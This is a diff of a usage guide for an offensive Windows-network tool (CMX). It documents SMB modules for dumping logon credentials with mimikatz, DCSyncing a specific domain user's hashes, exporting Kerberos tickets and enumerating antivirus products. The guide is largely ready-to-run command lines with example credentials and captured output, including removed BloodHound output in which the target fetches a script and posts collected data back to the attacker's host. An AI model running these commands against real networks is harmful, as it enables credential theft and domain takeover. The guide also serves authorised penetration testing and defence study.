@@ -3,8 +3,6 @@ Created by: @awsmhacks
 Updated: 8/20/19   
 CMX Version: 5.0.1
   
-** NOT FINISHED **
-
 
 **Notes:**  
 * The following examples assume you have a Kali Linux host connected to an internal network.    
@@ -13,192 +11,195 @@ CMX Version: 5.0.1
 - - -(better timeout messages are still a work-in-progress)  
   
 
---------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
---------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
-# Modules
+# Using Modules
 
 ## List available SMB modules
-Returns a list of loaded modules. The protocol can be replaced, i.e. {smb, http, mssql, winrm, ssh}
+Returns a list of loaded modules. The protocol can be replaced, i.e. {smb, winrm}
 ```
 ~# cmx smb -L
 ```
 **Expected Results:**
 ```
+[*] enum_av                   Enum AV products on the the remote host(s) via WMI
+[*] getcompdetails            Enumerates sysinfo
+[*] kerberoast                Kerberoasts all found SPNs for the current domain
 [*] mimikatz                  Dumps all logon credentials from memory
 ```
---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+----------------------------------------------------------------------------------------------------
 ## List Module Options
 Returns options specific to a module
 ```
 ~# cmx smb -M <module_name> --options
 ```
---------------------------------------------------------------------------------------------------------------------------------------------------------
+```
+~# cmx smb -M mimikatz --options
+
+[*] mimikatz module options:
+
+    Module Options:
+           COMMAND  Mimikatz command to execute (default: 'privilege::debug sekurlsa::logonpasswords exit')
+
+cmx --verbose smb 192.168.1.1 -u username -p password -M mimikatz -mo COMMAND='privilege::debug sekurlsa::logonpasswords exit'
+
+```
+
+----------------------------------------------------------------------------------------------------
 ## Specifying Module Options
-Module options are specified using -o after the module name  
+Module options are specified using -mo after the module name  
 All options should be specified in the form KEY=VALUE  
 When using several options, seperate with a space  
-    i.e -o KEY=VALUE KEY=VALUE KEY=VALUE  
+    i.e -mo KEY=VALUE KEY=VALUE KEY=VALUE  
 ```
-~# cmx smb -M <module_name> -o KEY=VALUE [KEY=VALUE] [KEY=VALUE]
+~# cmx smb -M <module_name> -mo KEY=VALUE [KEY=VALUE] [KEY=VALUE]
+
+cmx --verbose smb 192.168.1.1 -u username -p password -M mimikatz -mo COMMAND='privilege::debug sekurlsa::logonpasswords exit'
 ```
---------------------------------------------------------------------------------------------------------------------------------------------------------
-## Using Modules (and Options)
-Modules must be specified after the protocol, target and credentials.  
-Many Modules have default options, otherwise options must be specified.   
-```
-~# cmx <protocol> <target> <credentials> -M <module_name> [-o KEY=VALUE [KEY=VALUE] [KEY=VALUE]]
-```
-**Example:**
-```
-~# cmx smb 192.168.1.0/24 -u Admin -p 'p@ssw0rd' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
-```
---------------------------------------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------------------------------------
+
+----------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------
 
 
 
+# Module Commands Reference
+----------------------------------------------------------------------------------------------------
+## mimikatz      
+Executes Invoke-Mimikatz.ps1 script.
+This contains the full functionality of mimikatz.  
+I'll try to keep this up-to-date with new releases  
+
+If it isnt up-to-date you can recompile the Invoke-Mimikatz script yourself using the included Invoke-UpdateMimikatzScript
+See that script itself for information on how-to  
 
 
-
-
-# SMB Modules Reference
---------------------------------------------------------------------------------------------------------------------------------------------------------
-## bloodhound 
-Executes the BloodHound recon script on the target and retreives the results onto the attackers' machine
-
-**Notes:**
-CMX uses this bloodhound.ps1 file   
-XXX
-which may be out-of-date with the latest bloodhound(sharphound) release
-  
-Multiple_Host | Requires LA | Requires DA | Opsec_safe
-|---|---|---|---|
-true | true | false | true  
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| true          | false       | true        | false       | true*      | 
 
 **Options:**
 ```
-        THREADS           Max numbers of threads to execute on target (defaults to 20)
-        COLLECTIONMETHOD  Method used by BloodHound ingestor to collect data (defaults to 'Default') 
-                                Can be 'Group','ACLs','ComputerOnly','LocalGroup','GPOLocalGroup', 'Session','LoggedOn','Trusts','Stealth', or 'Default'
-        CSVPATH           (optional) Path where csv files will be written on target (defaults to C:\)
-        NEO4JURI          (optional) URI for direct Neo4j ingestion (defaults to blank)
-        NEO4JUSER         (optional) Username for direct Neo4j ingestion
-        NEO4JPASS         (optional) Pass for direct Neo4j ingestion
+For a full list of options see https://github.com/gentilkiwi/mimikatz/wiki
+```
+**Example Usages:**
+```
+~# cmx smb 10.10.33.121 -u Administrator -p AdminSuper\!23 -M mimikatz
 ```
 
-**Example Usage:**
+*When using multiple commands, spaces are used as the delimeter.*
+To issue commands with spaces in them, nest them inside quotes:
+i.e to use `kerberos::list /export` becomes `privilege::debug "kerberos::list /export" exit`
 ```
-~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M bloodhound -o THREADS=25 COLLECTIONMETHOD=Default
-```
-**Expected Results:**
-```
-[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
-SMB         192.168.1.121    445    DESKTOP1         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:DESKTOP1) (domain:PACIFIC) (signing:False) (SMBv1:True)
-SMB         192.168.1.121    445    DESKTOP1         [+] PACIFIC\tcat:User!23 (Pwn3d!)
-BLOODHOU... 192.168.1.121    445    DESKTOP1         [+] Executed launcher
-BLOODHOU...                                         [*] Waiting on 1 host(s)
-BLOODHOU... 192.168.1.121                            [*] - - "GET /BloodHound-modified.ps1 HTTP/1.1" 200 -
-BLOODHOU... 192.168.1.121                            [+] Executing payload... this can take a few minutes...
-BLOODHOU...                                         [*] Waiting on 1 host(s)
-BLOODHOU... 192.168.1.121                            [*] - - "POST / HTTP/1.1" 200 -
-BLOODHOU... 192.168.1.121                            [*] Saved csv output to user_sessions-192.168.1.121-2018-11-28_120010.csv
-BLOODHOU... 192.168.1.121                            [*] Saved csv output to group_membership.csv-192.168.1.121-2018-11-28_120010.csv
-BLOODHOU... 192.168.1.121                            [*] Saved csv output to local_admins.csv-192.168.1.121-2018-11-28_120010.csv
-BLOODHOU... 192.168.1.121                            [*] Saved csv output to trusts.csv-192.168.1.121-2018-11-28_120010.csv
-BLOODHOU... 192.168.1.121                            [+] Successfully retreived data
+~# cmx smb 10.10.33.123 -u agrande -p User\!23 -M mimikatz -mo COMMAND='privilege::debug "kerberos::list /export" exit'
 ```
 
-CSV output files are saved to /root/.cmx/logs/
+DCSync a specific user:
 ```
-~# ls -l /root/.cmx/logs/
--rw-r--r-- 1 root root      40 Nov 28 12:00 group_membership.csv-192.168.1.121-2018-11-28_120010.csv
--rw-r--r-- 1 root root      43 Nov 28 12:00 local_admins.csv-192.168.1.121-2018-11-28_120010.csv
--rw-r--r-- 1 root root      72 Nov 28 12:00 trusts.csv-192.168.1.121-2018-11-28_120010.csv
--rw-r--r-- 1 root root      35 Nov 28 12:00 user_sessions-192.168.1.121-2018-11-28_120010.csv
+~# cmx smb 10.10.33.123 -u Administrator -p AdminSuper\!23 -M mimikatz -mo COMMAND='privilege::debug "lsadump::dcsync /user:OCEAN\\mbellamy " exit'
 ```
 
-**Example usage w/direct connection to neo4j:**
-
-**Note:** 
-    To use this you need to edit the default neo4j config at /usr/share/neo4j/conf/neo4j.config  
-    Jump down to the "Network connector configuration"  
-    Edit or just uncomment the line (to listen on all interfaces)  
-        dbms.connectors.default_listen_address=0.0.0.0    
-The neo4juri parameter will then be the ip address of the box running neo4j, port 7474 by default  
-
-```
-~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M bloodhound -o NEO4JURI='bolt://10.10.33.200:7687' NEO4JUSER=neo4j NEO4JPASS=neo4j2 COLLECTIONMETHOD=Default
-```
-**Expected Results:**
-```
-SMB         192.168.1.121    445    DESKTOP1         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:DESKTOP1) (domain:PACIFIC) (signing:False) (SMBv1:True)
-SMB         192.168.1.121    445    DESKTOP1         [+] PACIFIC\tcat:User!23 (Pwn3d!)
-BLOODHOU... 192.168.1.121    445    DESKTOP1         [+] Executed launcher
-BLOODHOU...                                         [*] Waiting on 1 host(s)
-BLOODHOU... 192.168.1.121                            [*] - - "GET /BloodHound-modified.ps1 HTTP/1.1" 200 -
-BLOODHOU... 192.168.1.121                            [+] Executing payload... this can take a few minutes...
-BLOODHOU... 192.168.1.121                            [*] - - "POST / HTTP/1.1" 200 -
-BLOODHOU... 192.168.1.121                            [+] Successfully retreived data
-```
-Then just fire up bloodhound and refresh the DB
-
---------------------------------------------------------------------------------------------------------------------------------------------------------
-## empire_exec   
-### the api has been dropped in empire, this is no longer supported.
+Output will be jumbled for results other than the default, but the full, well formated results are  
+saved to a log file. 
 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------
-## enum_avproducts           
+----------------------------------------------------------------------------------------------------
+## enum_av          
 Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
 
 **Options:**
 None
 
-Multiple_Host | Requires LA | Requires DA | Opsec_safe
-|---|---|---|---|
-true | true | false | true 
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| true          | false       | true        | false       | true*      |
 
 
 **Example Usage:**
 ```
-~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M enum_avproducts
+~# cmx smb 10.10.33.123 -u agrande -p User\!23 -M enum_av
 ```
 **Expected Results:**
-(This was ran against a host running Windows Defender and Sentinel 1)
+(This was ran against a host running Windows Defender)
 ```
-SMB         192.168.1.121    445    DESKTOP3         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:DESKTOP3) (domain:PACIFIC) (signing:False) (SMBv1:True)
-SMB         192.168.1.121    445    DESKTOP3         [+] PACIFIC\tcat:User!23 (Pwn3d!)
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         [+] Found Anti-Spyware product:
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {CAC39F2D-1B9C-4A72-5A17-3B3D19BB2B34}
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Microsoft Security Essentials
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\Microsoft Security Client\msseces.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\Microsoft Security Client\MsMpEng.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 397312
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Windows Defender
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => %ProgramFiles%\Windows Defender\MSASCui.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => %SystemRoot%\System32\svchost.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 393472
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {32093CFB-7D72-C309-45BF-16D0A556244B}
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Sentinel Agent
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelRemediation.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelAgent.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 266240
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         [+] Found Anti-Virus product:
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {71A27EC9-3DA6-45FC-60A7-004F623C6189}
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Microsoft Security Essentials
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\Microsoft Security Client\msseces.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\Microsoft Security Client\MsMpEng.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 397312
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         instanceGuid => {8968DD1F-5B48-CC87-7F0F-2DA2DED16EF6}
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         displayName => Sentinel Agent
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedProductExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelRemediation.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         pathToSignedReportingExe => C:\Program Files\SentinelOne\Sentinel Agent 2.6.2.5944\SentinelAgent.exe
-ENUM_AVP... 192.168.1.121    445    DESKTOP3         productState => 266240
-~# 
+Aug.30.19 13:14:30  SMB         10.10.33.123:445  WIN7E-PC [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
+Aug.30.19 13:14:30  SMB         10.10.33.123:445  WIN7E-PC [+] OCEAN\agrande:User!23 (Pwn3d!)
+Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          [+] Found Anti-Spyware product:
+Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          instanceGuid => {D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
+Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          displayName => Windows Defender
+Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          pathToSignedProductExe => %ProgramFiles%\Windows Defender\MSASCui.exe
+Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          pathToSignedReportingExe => %SystemRoot%\System32\svchost.exe
+Aug.30.19 13:14:31  ENUM_AV     10.10.33.123:445          productState => 393488
+
 ```
+
+----------------------------------------------------------------------------------------------------
+
+## bloodhound 
+
+Removed: I recommend just using [bloodhound.py](https://github.com/fox-it/BloodHound.py)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# not yet supported
+
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 ## enum_chrome
 ### not currently working due to command length limits see https://github.com/byt3bl33d3r/CrackMapExec/issues/223
@@ -538,26 +539,7 @@ true | true | false | true
 ~# 
 ```
 --------------------------------------------------------------------------------------------------------------------------------------------------------
-## mimikatz                  
-Its mimikatz... 
 
-Multiple_Host | Requires LA | Requires DA | Opsec_safe
-|---|---|---|---|
-true | true | false | true  
-
-**Options:**
-```
-    COMMAND  Mimikatz command to execute (default: 'sekurlsa::logonpasswords')
-```
-**Example Usage:**
-```
-~# cmx smb 192.168.1.121 -u tcat -p 'User!23' -M mimikatz
-```
-**Expected Results:**
-```
-
-~# 
-```
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 ## mimikatz_enum_chrome      
 Executes PowerSploit's Invoke-Mimikatz.ps1 script (Mimikatz's DPAPI Module) to decrypt saved Chrome passwords  
